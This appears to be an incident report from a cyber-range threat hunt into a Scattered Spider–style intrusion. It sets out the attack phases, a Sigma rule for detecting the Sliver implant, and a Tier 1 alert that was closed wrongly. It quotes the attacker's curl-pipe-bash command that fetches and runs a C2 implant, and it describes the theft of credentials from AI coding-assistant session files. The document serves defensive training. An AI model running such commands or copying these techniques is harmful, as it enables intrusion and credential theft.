Executive Summary

A confirmed Scattered Spider intrusion

This report documents the complete investigation of Operation Silent Corridor — a confirmed Octo Tempest (Scattered Spider / UNC3944) intrusion into Greenfield Operations' Azure-connected Linux and Windows infrastructure. The hunt was conducted live against an Azure Sentinel cyber range with 1,800 students, using the Universal Hunt Agent V4 across 13 telemetry tables and 64,357 events.

The threat actor gained initial VPN access via compromised sancadmin credentials, conducted 42 minutes of preparation, then used a second compromised account (a.kumar) to deploy a Sliver C2 implant named helix-update via a curl|bash delivery chain. The implant autonomously exfiltrated Claude AI session files, harvested AWS and Kubernetes credentials, added a backdoor SSH key, and established container-based C2 persistence, before pivoting to Windows infrastructure using stolen credentials.

Attack Chain

Five phases, one operator

01
Preparation · 20:47–21:29 UTC

VPN entry & reconnaissance

sancadmin VPN'd into GF-VPN01 from 194.36.110.139 (AS9009/M247 bulletproof hosting), SSH'd to GF-DEV01, and ran ~30 recon commands: hostname, id, whoami, .env reads, Docker version checks.

02
Initial Access · 21:29–21:54 UTC

The AI session-file theft

Switching to a.kumar, the attacker read two AI development session files — a Claude Code session and a Codex session — containing API keys, credentials, and architecture details. A novel attack vector targeting AI-assisted development workflows.

03
C2 Deployment · 21:54–22:10 UTC

Sliver implant, named to blend in

curl -fsSL https://dl.abordsecurity.space/install.sh | bash deployed a 15MB Sliver C2 implant named helix-update — deliberately mimicking the target application's own naming.

04
Persistence · 22:57 UTC

Attribution left behind

A backdoor SSH key was written with comment octotempest@operator — the operator's own persona identifier, and the single strongest attribution signal in the entire investigation.

05
Lateral Movement · 23:39–01:14 UTC

Four techniques, all blocked

Via a Ligolo-ng tunnel, the attacker attempted SMB, WinRM, and WMI lateral movement to GF-WS01 using stolen t.harris credentials. Every attempt failed — Microsoft Defender for Cloud's agentless scanning caught the dropped hacktool before execution.

Detection Engineering

The Sigma rule that came out of it

sigma rule
title: Sliver implant execution via nohup reparenting
status: stable
description: Detects Sliver C2 implant launched via nohup with systemd as parent (PPID 1)
logsource:
  service: audit
detection:
  selection:
    Image|endswith: '/helix-update'
    ParentImage|endswith: '/sbin/init'
  condition: selection
level: critical
tags: [attack.persistence, attack.t1543.002, attack.t1055]

A process in /tmp with ParentImage /sbin/init (PPID 1) indicates deliberate nohup detachment — near-zero false positive rate. Any production hit is a confirmed implant runtime.

Detection Gap Analysis

The alert that got closed wrong

Nine alerts fired during the incident window and were closed as false positives by Tier 1. One was a critical misclassification:

CLOSED-5 — Misclassified as Baseline

A DNS query to dl.abordsecurity.space (21:50–22:05) was closed as a baseline false positive. It was in fact the C2 delivery domain resolving during the helix-update download. One follow-up query at 21:50 — identifying the process and what it downloaded — would have stopped the investigation before the binary executed.
